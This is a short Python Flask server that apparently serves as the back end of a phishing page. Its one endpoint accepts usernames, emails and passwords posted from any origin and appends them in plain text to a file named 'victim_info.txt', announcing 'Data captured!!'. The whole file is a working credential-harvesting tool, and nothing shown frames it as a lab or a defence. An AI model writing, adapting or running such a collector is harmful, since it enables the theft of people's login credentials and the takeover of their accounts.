from flask import Flask, request, jsonify
from flask_cors import CORS
import json

app = Flask(__name__)

CORS(app)


@app.route('/savefile', methods=['POST'])
def save_file():

    try:
        data = request.get_json()
        username = data['username']
        password = data['password']
        if "email" in data:
            email = data['email']
        else:
            email=''
        # jsonData = {"":username, "password": password}
        with open("./victim_info.txt", "a+") as file:
            #json.dump(data, file)
            file.write(f'{username}, {email}, {password}\n')

        print("Data captured!!")

        return jsonify(200)

    except Exception as e:
        print(f"Error capturing data. Error: {e}")

if __name__ == '__main__':
    app.run(host="localhost", port=2400, debug=True)
